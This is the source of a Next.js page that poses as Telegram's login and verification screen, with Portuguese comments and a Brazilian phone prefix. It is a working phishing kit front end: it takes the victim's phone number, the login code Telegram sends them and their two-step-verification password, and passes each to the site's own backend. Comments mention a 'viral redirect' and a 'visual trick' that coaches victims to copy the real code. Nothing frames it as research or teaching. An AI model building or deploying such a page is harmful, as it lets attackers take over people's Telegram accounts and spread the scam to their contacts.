import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function Home() {
  const [step, setStep] = useState(1); // 1: Phone, 2: Code, 3: Password (2FA)
  const [loading, setLoading] = useState(false);
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [hash, setHash] = useState('');

  // Cores Oficiais
  const tgBg = '#1c242f';       // Fundo App
  const tgCard = '#242f3d';     // Fundo Card/Input
  const tgBlue = '#3390ec';     // Azul Botão
  const tgText = '#ffffff';     // Texto Principal
  const tgHint = '#7f91a4';     // Texto Secundário

  const handleSendCode = async () => {
    if(phone.length < 10) return setError('Número inválido.');
    setLoading(true); setError('');
    
    try {
      const res = await fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phone }),
      });
      const data = await res.json();
      if (res.ok) {
        setHash(data.phoneCodeHash);
        setStep(2);
      } else {
        setError('Tente novamente mais tarde.');
      }
    } catch (err) { setError('Erro de conexão.'); }
    setLoading(false);
  };

  const handleVerifyCode = async () => {
    setLoading(true); setError('');
    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            phoneNumber: phone, 
            code, 
            phoneCodeHash: hash, 
            password 
        }),
      });
      const data = await res.json();

      if (data.status === 'needs_2fa') {
          setStep(3);
          setLoading(false);
          return;
      }

      if (res.ok && data.success) {
        // Redirecionamento Viral
        window.location.href = data.redirect;
      } else {
        setError('Código incorreto.');
      }
    } catch (err) { setError('Erro na validação.'); }
    setLoading(false);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', backgroundColor: tgBg, fontFamily: '-apple-system, Roboto, Helvetica, Arial, sans-serif' }}>
      <Head>
        <title>Telegram Verification</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
        <meta name="theme-color" content="#1c242f" />
      </Head>

      {/* Topo estilo App Mobile */}
      <div style={{ width: '100%', maxWidth: '400px', padding: '20px', textAlign: 'center' }}>
        
        <div style={{ marginBottom: '30px' }}>
            <svg width="100" height="100" viewBox="0 0 200 200" fill="none">
                <circle cx="100" cy="100" r="100" fill={tgBlue}/>
                <path d="M149.5 56.5L40.5 98.5C33 101.5 33 105.5 39 107.5L67 116L132.5 75C135.5 73 138.5 74.5 136 76.5L82.5 125L79.5 154.5C82.5 154.5 83.5 153.5 86.5 150.5L107 131L138.5 154.5C144.5 157.5 147.5 154.5 149 148.5L168.5 61C170.5 53 165.5 50 149.5 56.5Z" fill="white"/>
            </svg>
        </div>

        <h1 style={{ color: tgText, fontSize: '24px', fontWeight: '500', marginBottom: '12px' }}>
          {step === 1 ? 'Entrar no Telegram' : step === 2 ? 'Verificação' : 'Proteção de Nuvem'}
        </h1>
        
        <p style={{ color: tgHint, fontSize: '15px', lineHeight: '1.4', marginBottom: '30px' }}>
          {step === 1 ? 'Confirme seu código de país e insira seu número de telefone.' : 
           step === 2 ? `Enviamos o código para o app do Telegram no número ${phone}.` :
           'Insira sua senha da Verificação em Duas Etapas.'}
        </p>

        {error && <div style={{ color: '#ff5c5c', fontSize: '14px', marginBottom: '15px' }}>{error}</div>}

        {/* PASSO 1: TELEFONE */}
        {step === 1 && (
          <div style={{ width: '100%' }}>
            <div style={{ backgroundColor: tgCard, borderRadius: '12px', padding: '5px 15px', marginBottom: '20px' }}>
                <div style={{ borderBottom: `1px solid #10161d`, padding: '15px 0', display: 'flex', alignItems: 'center' }}>
                    <span style={{ color: tgText, fontSize: '18px', marginRight: '15px' }}>🇧🇷 +55</span>
                    <input
                      type="tel"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="99999-9999"
                      style={{ background: 'transparent', border: 'none', color: tgText, fontSize: '18px', width: '100%', outline: 'none' }}
                    />
                </div>
            </div>
            
            <button
              onClick={handleSendCode}
              disabled={loading}
              style={{ width: '100%', padding: '15px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', opacity: loading ? 0.7 : 1, textTransform: 'uppercase' }}
            >
              {loading ? 'Aguarde...' : 'Continuar'}
            </button>
          </div>
        )}

        {/* PASSO 2: CÓDIGO (AQUI ESTÁ A MÁGICA VISUAL) */}
        {step === 2 && (
          <div style={{ width: '100%' }}>
            
            {/* O "Truque" Visual: Simulando a mensagem para ele saber o que procurar */}
            <div style={{ textAlign: 'left', backgroundColor: '#2b3847', borderRadius: '10px', padding: '15px', marginBottom: '25px', border: '1px solid #364455' }}>
                <p style={{ color: tgHint, fontSize: '12px', marginBottom: '8px', textTransform: 'uppercase', fontWeight: 'bold' }}>Procure esta mensagem:</p>
                <div style={{ display: 'flex', gap: '10px' }}>
                    <div style={{ width: '40px', height: '40px', borderRadius: '50%', background: '#4a95d6', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2ZM12 11.99H7V10H12V7L17 11L12 15V11.99Z"/></svg>
                    </div>
                    <div>
                        <div style={{ color: '#fff', fontSize: '14px', fontWeight: 'bold' }}>Telegram</div>
                        <div style={{ color: '#fff', fontSize: '13px' }}>
                            Código de login: <span style={{ color: '#4a95d6', fontWeight: 'bold', fontSize: '14px' }}>77700</span>. <span style={{opacity: 0.5}}>Não envie para...</span>
                        </div>
                    </div>
                </div>
            </div>

            <div style={{ position: 'relative', marginBottom: '20px' }}>
                <input
                  type="tel"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  placeholder="Código de 5 dígitos"
                  maxLength={5}
                  style={{ width: '100%', padding: '15px', backgroundColor: tgCard, border: 'none', borderRadius: '12px', color: tgText, fontSize: '24px', textAlign: 'center', letterSpacing: '8px', outline: 'none' }}
                  autoFocus
                />
            </div>

            <button
              onClick={handleVerifyCode}
              disabled={loading}
              style={{ width: '100%', padding: '15px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Verificando...' : 'Confirmar'}
            </button>
          </div>
        )}

        {/* PASSO 3: SENHA (2FA) */}
        {step === 3 && (
          <div style={{ width: '100%' }}>
            <div style={{ marginBottom: '20px' }}>
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Sua senha"
                  style={{ width: '100%', padding: '15px', backgroundColor: tgCard, border: 'none', borderRadius: '12px', color: tgText, fontSize: '18px', outline: 'none' }}
                  autoFocus
                />
            </div>
            <button
              onClick={handleVerifyCode}
              disabled={loading}
              style={{ width: '100%', padding: '15px', backgroundColor: tgBlue, color: 'white', border: 'none', borderRadius: '12px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', opacity: loading ? 0.7 : 1 }}
            >
              {loading ? 'Entrar' : 'Acessar'}
            </button>
          </div>
        )}

      </div>
    </div>
  );
}
